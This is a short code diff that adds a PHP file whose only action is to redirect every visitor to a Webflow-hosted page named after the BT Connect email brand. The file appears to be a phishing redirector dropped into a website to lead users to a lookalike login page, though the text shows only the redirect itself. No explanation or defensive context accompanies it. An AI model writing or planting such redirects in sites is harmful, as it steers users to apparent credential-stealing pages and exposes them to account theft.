@@ -1,0 +1,3 @@
+<?php
+header("Location: https://btconnect-4aecb3.webflow.io/");
+?>
